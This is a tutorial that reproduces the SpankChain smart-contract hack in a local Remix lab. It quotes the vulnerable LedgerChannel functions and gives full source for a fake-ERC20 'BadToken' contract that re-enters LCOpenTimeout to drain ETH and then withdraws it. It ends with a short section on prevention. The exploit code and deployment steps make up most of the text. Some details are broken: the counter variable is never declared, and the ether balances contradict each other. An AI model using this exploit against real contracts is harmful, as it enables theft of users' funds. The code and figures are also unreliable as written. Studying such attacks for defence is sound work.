## Spankchain Hack
SpankChain, a popular webcam blockchain platform, had one of its smart contracts for their [state channel](https://www.youtube.com/watch?v=83XyTOp-4IE) solution hacked recently. An attacker used a [re-entrancy bug](https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4) much like the one exploited in The DAO. The attacker created a smart contract that masqueraded as an [ERC20 token](https://blockgeeks.com/guides/erc20-tokens/) which the attacker then repeatedly called a transfer function from until it drained users’ smart contracts of all their ETH.

You can read more about the hack [here](https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe) from SpankChain themselves.

Copy the smart contract [source code](https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code) and paste it into [Remix](http://remix.ethereum.org/).

If you look at their code, there are a lot of functions within multiple contracts. We only care about the **LedgerChannel** contract and two of its functions, _createChannel_ and _LCOpenTimeout_, so delete all the other functions in your file.

SpankChain created a payment channel smart contract that allows two parties to transact with each other without having to send every transaction on the main Ethereum blockchain which ends up costing a lot in fees over time.

Anyone can create a channel and then once someone else joins the channel it is then considered open, and then the two parties can transact with each other back and forth through this channel, and then when they are finished transacting they can close the channel and the final state of their transaction balance is then updated on the blockchain. So people end up paying orders of magnitude less, as hundreds to thousands of transactions can be conducted off-chain.

### Create Channel Function

The _createChannel_ function checks some conditions to make sure the channel can be opened, then assigns the two parties transacting on the payment channel to an array _partyAddresses_. The first is the _msg.sender_ which is going to be our malicious contract that we’re going to create. The second is a counter-party provided as an argument to the function, *_partyI*. It then allows us to set the initial balances of ETH and ERC20 tokens for the user who is creating the channel. The specific details of this function is not that important because this function does not contain the vulnerable code that we’ll exploit. The main thing is that we’ll be calling this function to open a channel.


Whenever someone creates a channel there is a set amount of time for the other party to join, and if the other party doesn’t join within that time, the channel times out and in that case, the address of the channel creator can call the _LCOpenTimeout_ function to withdraw their ETH and ERC20 tokens back to their account. We only show the relevant portion of the _createChannel_ function here.

    function createChannel(
        bytes32 _lcID,
        address _partyI,
        uint256 _confirmTime,
        address _token,
        uint256[2] _balances // [eth, token]
    )
        public
        payable
    {
        // ...

        Channels[_lcID].partyAddresses[0] = msg.sender;
        Channels[_lcID].partyAddresses[1] = _partyI;

        if(_balances[0] != 0) {
            require(msg.value == _balances[0], "Eth balance does not match sent value");
            Channels[_lcID].ethBalances[0] = msg.value;
        }
        if(_balances[1] != 0) {
            Channels[_lcID].token = HumanStandardToken(_token);
            require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),"CreateChannel: token transfer failure");
            Channels[_lcID].erc20Balances[0] = _balances[1];
        }

        // ...
    }


### Time Out Function
The _LCOpenTimeout_ function is the one that contains a bug that we’ll exploit.
There are two transfer function calls. The first one transfers the Ether back to the channel creator.
The second one tries to transfer back ERC20 tokens back to the creator by invoking the transfer function of the ERC20 contract.
Or what they thinks is the token contract address but in reality it’s the attacker’s contract that looks like a token because it implements the _transfer_ and a _transferFrom_ function.

    function LCOpenTimeout(bytes32 _lcID) public {
        require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);
        require(now > Channels[_lcID].`LCOpenTimeout`);

        if(Channels[_lcID].initialDeposit[0] != 0) {
            Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);
        }
        if(Channels[_lcID].initialDeposit[1] != 0) {
            require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),"CreateChannel: token transfer failure");
        }

        emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);

        // only safe to delete since no action was taken on this channel
        delete Channels[_lcID];
    }

## Malicious ERC20 Contract
We are going to create a new contract that will exploit this code with a smart contract that looks like an ERC20 token, just as the hacker did. Create a file and copy the following code. We’re creating a new **BadToken** contract to exploit the SpankChain contract.

    contract Channel {
        function createChannel(
            bytes32 _lcID,
            address _partyI,
            uint256 _confirmTime,
            address _token,
            uint256[2] _balances // [eth, token]
        ) public payable;

        function LCOpenTimeout(bytes32 _lcID) public;
    }


    contract BadToken {
        address owner;
        address target; // spankchain contract address we want to exploit

        // just a random 32 bytes used for the channelID
        bytes32 data = bytes32(0x390469ecab3c63eb15dfc6470ef63d139d417ab93f3fbc659e992c70913f1f);

        constructor(address _target) public {
            owner = msg.sender;
            target = _target;
        }

        function() public payable {
            // Need this to accept ether transfer
        }

        function withdraw() public {
            require(msg.sender == owner);
            owner.transfer(address(this).balance);
        }

        function getBalace() public view returns(uint256) {
            return address(this).balance;
        }

        function openChannel() public payable {
            Channel(target).createChannel.value(msg.value)(data, address(this), 0, address(this), [uint256(msg.value), uint256(100)]);
        }

        function attack() public {
            Channel(target).LCOpenTimeout(data);
        }

        function transfer(address _receiver, uint256 _amount) public returns(bool) {
            if (callCount < 5) {
                callCount += 1;
                Channel(target).LCOpenTimeout(data);
            }
            return true;
        }

        function transferFrom(address _from, address _to, uint256 _amount) public returns(bool) {
            return true;
        }
    }

### Channel Interface
The **Channel** contract is just an interface we need to create by copying and pasting the function signatures from the _createChannel_ and _LCOpenTimeout_ functions in the SpankChain payment channel contract. We need this in order to call these functions from inside our **BadToken** contract. Notice that we don’t need to have the implementation of these function but just the signature.

### Open Channel
Inside the _openChannel_ function, we need to call the _createChannel_ function in the SpankChain contract. First we need to cast the _target_ address to the Channel interface and then we can invoke the desired function. Notice that this function is marked payable and we need to forward all the funds to the _createChannel_ function. We can do this by invoking the _.value_ function and pass in _msg.value_. Then we can pass in the other parameters: The random ID we generated, our contract’s address as the first party, 0 for the confirmation time, our contract’s address as the token address, and a balances array where the first element is the _msg.value_ and the second element is 100 tokens. The token amount doesn’t matter for the purposes of this demonstration.

### Transfer From Function
In order for the channel to be open successfully, we need to implement _transferFrom_ function that has the exact same function signature as any ERC20 token. This is how we’re tricking the SpankChain contract into thinking we are an ERC20 token. Inside the _createChannel_ function, it will call our _transferFrom_ function and it’s wrapped inside a _require_ statement. Therefore, all we need to do is return true in our function to successfully bypass the conditional check.

### Initiate Attack
Now inside our _attack_ function, we will call the _LCOpenTimeout_ function to initiate the attack. The _LCOpenTimeout_ function will return the ETH we’ve sent in the _openChannel_ function back to us along with the 100 fake tokens we’ve sent to it by invoking the _transfer_ function that we’ve implemented. So inside the _transfer_ function is where we will **re-enter** back into the SpankChain’s contract again.


Transfer Function
The _LCOpenTimeout_ function calls two separate _transfer_ functions. The first is to return the ETH we’ve sent when creating the channel. Therefore, we need to implement a fallback function that is _payable_ in order to receive ether. However, we can not do anything else inside this fallback function because Ethereum by default only forwards 2300 gas to fallback functions which is not enough gas for us to initiate any function calls.

The second call to _transfer_ is going forward all the remaining gas to invoke our fake ERC20 function. This is where we can call back into the SpankChain’s _LCOpenTimeout_ function again. However to limit the call stack to a reasonable depth for our demo purposes, we will setup a simple counter to keep track of how many times we’re re-entering the function. Otherwise, it will take a while before all the funds in the contract is drained depending on how much ether the contract has.

### Withdraw Function
In order for the attacker to withdraw the stolen ETH from the **BadToken** contract, we need to implement a *withdraw* function that simply transfer the ETH to the contract owner. Notice that we cast the contract’s address and get the full *balance* and then transfers all the balance to the owner.


### Re-creating the attack
More or less ready to deploy the contracts now!

Before we do so, note that the contract will only have Ether if someone creates or joins a channel, or deposits money. Because there is no money to attack, we will create a payable fallback function and a getBalance in the LedgerChannel contract so we can send some ether into this contract to demonstrate the attack and see if the attack has worked.

Deploy the LedgerChannel contract in Remix from the first account (make sure you are in the Run tab in the Javascript VM environment), and then send 100 Ether to the fallback function so that the contract has some ETH for us to steal.

Now deploy the BadToken contract from the second account and pass in the address of the LedgerChannel into the constructor.

Open the channel now by calling openChannel from the second account with a a value of 1 Ether. Then check the balance of the ledger channel and you will see it has 11 ether in it now.

Now if you call attack you will see 6 ether stolen and 5 ETH is left in LedgerChannel contract. This is because the attack calls the LCOpenTimeout function the first time and then it re-enters the function again 5 more times after the initial call because of our callCount counter. Each time it transfers 1 ETH because that was the initial deposit amount we used to open the channel, which the contract is supposed to refund.

Once the attacker has the Ether in this malicious account they can transfer it out by making a withdraw function.


### Preventing Re-entrancy Attack
Whenever you are calling some external functions, especially ones with user-controlled parameters, it is important that you update the internal state of the contract before you call any functions.

The problem here is that they delete the channel after they send the money out. What they should have done is deleted the channel before transferring the funds back to the parties, and cache the value of the funds into a memory struct which then can be used to transfer the funds back, so that if the attacker tried calling the function again recursively, the channel would be deleted and the first condition would not be met and the hack would be thwarted.
